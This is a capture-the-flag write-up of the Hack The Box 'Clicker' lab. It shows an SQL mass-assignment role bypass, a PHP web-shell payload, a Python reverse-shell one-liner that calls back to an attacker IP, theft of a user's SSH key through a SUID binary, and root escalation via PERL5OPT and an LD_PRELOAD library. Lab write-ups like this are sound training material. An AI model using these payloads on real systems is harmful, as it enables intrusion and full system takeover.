
---
layout: post
title: HTB Clicker Writeup  
subtitle: Medium Linux Box
thumbnail-img: /assets/img/clicker/clicker.png
tags: [HTB]
---

| Name | Clicker |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Medium |


## Recon
I always begin with a rapid `nmap` scan. This quick scan employs the `-p-` flag to check all available ports and uses the `--min-rate 1000` setting, which sends 1000 packets per second. It provide's a rapid overview of open ports and services on the target without consuming excessive time or resources.

```
┌──(root㉿dragon)-[~/htb/clicker]
└─# nmap -p- --min-rate 1000 -oN allPorts.nmap 10.129.142.52                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 13:03 MDT
Nmap scan report for clicker.htb (10.129.142.52)
Host is up (0.047s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
33765/tcp open  unknown
35475/tcp open  unknown
43071/tcp open  unknown
57491/tcp open  unknown
57609/tcp open  unknown
```

My second scan targets each of the open ports using `nmap`'s scripting engine, revealing that the machine is running SSH, HTTP, and NFS services.
```
┌──(root㉿dragon)-[~/htb/clicker]                                
└─# nmap -p 22,80,111,2049,33765,35475,43071,57491,57609 -sVC -oN script.scan 10.129.142.52

PORT      STATE SERVICE  VERSION          
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                  
|   256 89d7393458a0eaa1dbc13d14ec5d5a92 (ECDSA)
|_  256 b4da8daf659cbbf071d51350edd81130 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Clicker - The Game        
| http-cookie-flags:                                           
|   /: 
|     PHPSESSID:
|_      httponly flag not set                                  
|_http-server-header: Apache/2.4.52 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)                      
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      32773/tcp6  mountd
|   100005  1,2,3      33216/udp   mountd
|   100005  1,2,3      33765/tcp   mountd
|   100005  1,2,3      42803/udp6  mountd
|   100021  1,3,4      42183/tcp6  nlockmgr
|   100021  1,3,4      43071/tcp   nlockmgr
|   100021  1,3,4      43319/udp   nlockmgr
|   100021  1,3,4      43407/udp6  nlockmgr
|   100024  1          36590/udp   status
|   100024  1          54918/udp6  status
|   100024  1          57609/tcp   status
|   100024  1          60887/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33765/tcp open  mountd   1-3 (RPC #100005)
35475/tcp open  mountd   1-3 (RPC #100005)
43071/tcp open  nlockmgr 1-4 (RPC #100021)
57491/tcp open  mountd   1-3 (RPC #100005)
57609/tcp open  status   1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SSH TCP/22
`nmap` detected that the machine is running OpenSSH version 8.9p1 for Ubuntu, which, at the time of release, had no publicly available vulnerabilities. The only potential avenue for exploitation would be a brute force attack on the service. However, such attempts are generally highly ineffective and not worth the computational resources.

### HTTP TCP/80
To make things easier, I added a DNS entry in my `/etc/hosts` file for `clicker.htb`. HTB typically follows the trend of using `machineName.htb`.
The website being served appears to focus on a clicking-based video game.  
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/1.png)

#### Technology Stack
I always aim to identify both the front end and back end of an application to uncover potential vulnerabilities. When I visited `http://clicker.htb`, it automatically redirected me to `http://clicker.htb/index.php`. Alongside this, `nmap` revealed that the web server is Apache, and we've confirmed that PHP is running on this server. There is a good chance this is running LAMP.
#### Reflected XSS
I registered an account through the registration page and observed that after logging in, a 'msg' parameter appeared in the URL with the message 'Successfully registered.' This message was also displayed on the screen.
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/2.png)


I conducted a simple test for a reflected XSS (Cross-Site Scripting) attack, where a malicious script can be embedded in a URL. Reflected XSS attacks are commonly used in scenarios where attackers attempt to deceive users into clicking on a specially crafted link, often through methods like phishing emails, malicious advertisements, or social engineering. It's important to note that the impact of a reflected XSS attack is usually confined to the user who clicks the malicious link, as the payload isn't stored on the server or in a persistent manner. While it's always a good practice to check for such vulnerabilities, it may not be particularly useful in the context of this CTF (Capture The Flag) challenge.
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/3.png)


#### Game Vulnerability 
While exploring the application, I discovered an endpoint named `/play.php`, which allows users to engage in the clicker game and save their progress. The application sends a POST request to `/save_game.php?clicks=29&level=1` for saving game data. What piqued my interest is that I successfully manipulated this request using Burp, enabling me to set my own desired values for clicks and levels. In the case of this clicker game, it may not have significant implications, aside from bragging rights among friends. However, in games with in-game currency and a large player base, such manipulation could pose a real issue, potentially leading to concerns like Real Money Trading (RMT) for financial gains.
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/4.png)

#### Directory Brute Force
After exploring the application, I decided to run `feroxbuster` in order to identify any additional endpoints worth testing. While it did uncover a few, the web server appeared to have limited content. With the absence of easily accessible vulnerabilities, I redirected my efforts towards enumerating other ports.
```
┌──(root㉿dragon)-[~/htb/clicker]                                
└─# feroxbuster -u http://clicker.htb -x php -C 400,502 --no-recursion --dont-extract-links         
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___              |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__               |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___              
by Ben "epi" Risher 🤓                 ver: 2.10.0                                                                                
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://clicker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [400, 502]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      107l      277w     2984c http://clicker.htb/
301      GET        9l       28w      311c http://clicker.htb/assets => http://clicker.htb/assets/
200      GET      127l      319w     3343c http://clicker.htb/info.php
302      GET        0l        0w        0c http://clicker.htb/export.php => http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/profile.php => http://clicker.htb/index.php
200      GET      107l      277w     2984c http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/logout.php => http://clicker.htb/index.php
302      GET        0l        0w        0c http://clicker.htb/play.php => http://clicker.htb/index.php
200      GET      114l      266w     3253c http://clicker.htb/register.php
200      GET      114l      266w     3221c http://clicker.htb/login.php
301      GET        9l       28w      312c http://clicker.htb/exports => http://clicker.htb/exports/
302      GET        0l        0w        0c http://clicker.htb/admin.php => http://clicker.htb/index.php
200      GET        0l        0w        0c http://clicker.htb/authenticate.php
401      GET        0l        0w        0c http://clicker.htb/diagnostic.php
```


### NFS TCP/111 & TCP/2049 
Network File System (NFS) is a distributed file system protocol enabling remote access to files and directories on a server as if they were local. It is widely employed in Unix and Unix-like operating systems for inter-system file and resource sharing, similar to SMB in Windows environments.

To identify available shares on the system, I used the `showmount` command. It revealed a single share named 'backups' on this machine.
```
┌──(root㉿dragon)-[~/htb/clicker]
└─# showmount -e clicker.htb 
Export list for clicker.htb:
/mnt/backups *
```

I mounted the `backups` share to `mnt` and discovered a zip folder containing a backup of the web-server. This backup could potentially yield valuable information, including passwords and vulnerabilities.
```
┌──(root㉿dragon)-[~/htb/clicker]
└─# mkdir mnt                                                   ┌──(root㉿dragon)-[~/htb/clicker]
└─# mount -t nfs clicker.htb:/mnt/backups mnt -o nolock
┌──(root㉿dragon)-[~/htb/clicker]
└─# ls mnt            
clicker.htb_backup.zip
┌──(root㉿dragon)-[~/htb/clicker]                      
└─# cp mnt/clicker.htb_backup.zip .                         
┌──(root㉿dragon)-[~/htb/clicker]                             
└─# unzip clicker.htb_backup.zip     
Archive:  clicker.htb_backup.zip     
   creating: clicker.htb/                                       
  inflating: clicker.htb/play.php        
  inflating: clicker.htb/profile.php 
```

### Vulnerability Discovery
While examining the web app's source code, I identified a bypass/injection method to elevate my user privileges to an admin level. My focus was on the 'save_game.php' script, which takes URL input and converts it into key-value pairs. These pairs, like 'level=1' and 'clicks=100,' are then passed to the 'save_profile' function for updating the player's score in the database.

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
        $args = [];
        foreach($_GET as $key=>$value) {
                if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role 
                        header('Location: /index.php?err=Malicious activity detected!');
                        die;
                }
                $args[$key] = $value;
        }
        save_profile($_SESSION['PLAYER'], $_GET);
        // update session info
        $_SESSION['CLICKS'] = $_GET['clicks'];
        $_SESSION['LEVEL'] = $_GET['level'];
        header('Location: /index.php?msg=Game has been saved!');

}
?>
```

`save_profile` is found in `db_utils.php` and requires two arguments: a player's name and the data for updating. It processes the URL-supplied arguments (`$args`) through a `foreach` loop to construct an SQL statement. The `value` part is correctly quoted and escaped using `$pdo->quote($value)`. This process results in a final SQL statement like this: `UPDATE players SET clicks='100', level='3' WHERE username = 'zonifer'`.

```php
function save_profile($player, $args) {                                                                                           
        global $pdo;                                                                                                              
        $params = ["player"=>$player];                                                                                            
        $setStr = "";                                                                                                             
        foreach ($args as $key => $value) {                                                                                       
                $setStr .= $key . "=" . $pdo->quote($value) . ",";                                                                
        }                                                                                                                         
        $setStr = rtrim($setStr, ",");                                                                                            
        $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");                                             
        $stmt -> execute($params);                                                                                                
}  
```

In `save_game.php`, URL parameters are passed to `save_profile`, which updates the database. The parameters are processed through a `foreach` loop, creating dynamic SQL update strings that modify fields in the database. Importantly, the code lacks restrictions on which fields can be updated, allowing an attacker to potentially modify any value, including user roles.

Within `db_utils.php`, I discovered a function that creates a new character in the database. This function sets various parameters, including `username`, `nickname`, `password`, `role`, `clicks`, and `level`. This provides valuable insights into the database's structure and the available columns.
```php
function create_new_player($player, $password) {
        global $pdo;
        $params = ["player"=>$player, "password"=>hash("sha256", $password)];
        $stmt = $pdo->prepare("INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:pas
sword,'User',0,0)");
        $stmt->execute($params); 
}
```

Exploiting the vulnerability in `save_game.php` grants me the capability to modify any field within the database table. My objective is to elevate my privileges by changing my role in the database to `admin`. The code's author has anticipated this maneuver and instituted a security measure to thwart unauthorized role updates. If the `role` parameter is present in the URL, it will trigger a redirection to the homepage.
```php
if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role 
                        header('Location: /index.php?err=Malicious activity detected!');
```

This can be bypassed using two backticks (\`\`), which are not considered special characters and are valid in MySQL. By encapsulating `role` within backticks, it bypasses the filter above and doesn't break the SQL statement.
```
/save_game.php?clicks=83&level=2&`role`=Admin
```

This is what the SQL statement will look like when constructed by the PHP application. For instance, when I set my role to `Admin`, the resulting SQL statement would resemble: 
```sql
UPDATE players SET clicks=33,role=`Admin` WHERE username = 'zonifer';
```

Upon logging out and logging back in I now have admin privileges! 
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/5.png)


(There is another way to bypass the filter that I will go over in more depth at the end of the post.)

### Web Shell
The administration panel allows for an export of the top players.
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/6.png)


Upon inspecting the request, I noticed that it had two adjustable parameters. I successfully modified the extension to include more options than those offered by the admin panel. I decided to try `php` as the extension, and the application generated an export of players' nicknames, clicks, and their respective levels in php!
```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=bj964h6lr5jsrdtg0idd1j9d9p
Upgrade-Insecure-Requests: 1

threshold=1&extension=php
```
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/7.png)
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/8.png)


Since I can create PHP pages and have access to the database, I can set a player's nickname to a PHP webshell that can be executed on the page. To do this, I'll start by updating my player's nickname using the same method explained above.
```
/save_game.php?nickname=<?=`$_GET[0]`?>
```

```
GET /save_game.php?nickname=%3C?=`$_GET[0]`?%3E HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=bj964h6lr5jsrdtg0idd1j9d9p
Upgrade-Insecure-Requests: 1

```

Next, I sent another request to `/export.php` with the extension changed to PHP. When I visited the export page, the PHP code we placed in our nickname was executed as valid PHP code, granting us code execution on the machine!
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/9.png)

With code execution, I can obtain a simple reverse shell using this one-liner in Python 3
```
http://clicker.htb/exports/top_players_g2j4aced.php?0=export%20RHOST=%2210.10.14.52%22;export%20RPORT=9001;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
```

```
┌──(root㉿dragon)-[~/htb/clicker/clicker.htb]
└─# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.52] from (UNKNOWN) [10.129.142.138] 46478
$ 
```

### Pivoting to Jack
While exploring the file system, I discovered a custom binary named 'execute_query,' which seems to be a utility for the web app's database.
```
$ pwd
/opt/manage

$ ls -la
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query

$ cat README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

I transferred this binary to my Kali VM using a Python web server for further analysis.
![clicker](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/clicker/10.png)

I decompiled the application in Ghidra, and below is the main function. It takes two parameters, `param_1` and `param_2`. Several other variables are set to values that I couldn't reverse-engineer, and it initializes some memory management-related variables. Depending on what the user supplies via the command line, it sets `pcVar3` to the specified name. For example, if `1` is supplied, it sets `pcVar3` to 'create.sql'. It's worth noting that `5` is a special case and sets `pcVar3` to whatever the second command line argument was.

The code then calls `setreuid` to change the effective user ID to 1000 for both real and effective user IDs. After that, it checks if the file is readable. Finally, it constructs and executes a system command.

In summary, this program reads a SQL file, executes its contents, and prints out the results.
```c
undefined8 main(int param_1,long param_2)

{
[snip]

// Make sure there are two arguments passed to it.
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }

// Switch statement to select the specified SQL statement
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
// This is the one we want to use as we can supply anything we want into pcVar3
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);

// Makes sure 
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

While running the binary, I used `pspy` to monitor the system and identify the command that the program was passing to the system, as I was unable to reverse engineer it from the decompiled Ghidra code:

`/usr/bin/mysql -u clicker_db_user --password=clicker_db_password clicker -v > SQLFILEHERE`

The program dynamically replaces my placeholder text based on the evaluation of the case statement mentioned earlier, and it feeds SQL files to the database. Additionally, it uses the `-v` option, enabling verbosity, which allows me to observe the specific contents being provided to the application.
```
2023/09/26 23:09:32 **CMD: UID=1000  PID=9687   | ./execute_query 2** 

2023/09/26 23:09:32 **CMD: UID=1000  PID=9688   | /usr/bin/mysql -u clicker_db_user --password=clicker_db_password clicker -v** 

2023/09/26 23:09:34 **CMD: UID=1000  PID=9689   |** 

2023/09/26 23:09:34 **CMD: UID=1000  PID=9690   | sh -c /usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < /home/jack/queries/reset_password.sql** 

2023/09/26 23:09:34 **CMD: UID=1000  PID=9691   | /usr/bin/mysql -u clicker_db_user --password=clicker_db_password clicker -v** 

2023/09/26 23:09:36 **CMD: UID=1000  PID=9692   | ./execute_query 4** 

2023/09/26 23:09:36 **CMD: UID=1000  PID=9693   | ./execute_query 4** 

2023/09/26 23:09:36 **CMD: UID=1000  PID=9694   | /usr/bin/mysql -u clicker_db_user --password=clicker_db_password clicker -v**
```

I exploited this application to read system files using the privileges of the 'jack' user (UID 1000, as listed in /etc/passwd). By utilizing the `5` option, which allowed me to provide my input, I gained access to 'jack's id_rsa file, subsequently granting me SSH access under his account. This exploit was possible due to the verbosity flag, which printed out the data/file fed to MySQL.
```
$ ./execute_query 5 '../.ssh/id_rsa'                              
mysql: [Warning] Using a password on the command line interface can be insecure.
                                                 
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
[snip]
```

I saved the file, adjusted its permissions using `chmod 600 jack_private`, and successfully gained user access!
```
┌──(root㉿dragon)-[~/htb/clicker]
└─# ssh -i jack_rsa jack@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 26 11:15:43 PM UTC 2023

  System load:           0.0087890625
  Usage of /:            54.2% of 5.77GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             241
  Users logged in:       1
  IPv4 address for eth0: 10.129.142.234
  IPv6 address for eth0: dead:beef::250:56ff:feb0:1708


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 26 21:25:33 2023 from 10.10.14.52
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$ 

```

### Pivot to root
As part of my enumeration, I routinely run `sudo -l` to check for any sudo privileges linked to my user account. In the case of Jack, I found that I have the ability to modify environment variables for a particular script.
```
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

The script that Jack can execute as a root user using the `SETEVN` command is designed to retrieve data from a diagnostic endpoint, apply a timestamp, and save the data. In addition to this, it manipulates the PATH variable and clears certain environment variables. Notably, this script adjusts the PATH variable and removes specific Perl environment variables. It's worth investigating the reasons behind unsetting the Perl variables. Further research reveals that `/usr/bin/xml_pp` is an executable file that utilizes the XML::Twig, which is a Perl module employed for data parsing.
```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

My next idea was to attempt setting a Perl environment variable that might enable me to elevate my privileges to root. During my search, I came across [this article](https://docstore.mik.ua/orelly/perl3/prog/ch19_02.htm) which discussed several available environment variables. The one that caught my attention was `PERL5OPT`, described as "Default command-line switches. Switches in this variable are treated as if they were on every Perl command line." Using `PERL5OPT`, I could apply command-line switches as root for `xml_pp`. By including `-d`, I could access the Perl debugger, potentially gaining elevated privileges.

```
jack@clicker:/opt$ sudo PERL5OPT=-d /opt/monitor.sh

Loading DB routines from perl5db.pl version 1.60
Editor support available.

Enter h or 'h h' for help, or 'man perldebug' for more help.

main::(/usr/bin/xml_pp:9):      my @styles= XML::Twig->_pretty_print_styles; # from XML::Twig
  DB<1> 
```

There's a debugger command, `!!`, which allows you to execute commands in a system subprocess. With this, it becomes straightforward to switch to a root shell and retrieve the flag!
```
  DB<1> !! whoami
root
  DB<2> !! /bin/bash
root@clicker:/opt# cat /root/root.txt
813a8198a[snip]
```

### Further Exploitation 

#### Root Via LD_PRELOAD
Another method of exploiting the `SETENV` to achieve root access involves the use of `LD_PRELOAD`. In case you're not familiar with `LD_PRELOAD`, it's an environment variable in Linux that enables you to define a list of shared libraries to be loaded before any other shared libraries when a program is launched.

Since we have access to `SETENV`, we can generate our custom shared library that will run with root privileges and spawn a shell. Below is the source code for `shell.c`:
```c
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash -p");
	}
```

Afterward, compile it using the command `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`. Then, transfer the shared library onto the target machine. You can accomplish this with tools like `wget` and set up a simple `python3` web server for the transfer. Finally, execute it with the `LD_PRELOAD` environment variable set to load your custom library.
```
jack@clicker:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /opt/monitor.sh
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

#### URL Bypass
There is another way to bypass the filter on `/save_game.php` and it is by URL encoding the request. The decoded request is `save_game.php?clicks=33,role=admin` and encoded it is `save_game.php?clicks%3D33%2crole=admin`
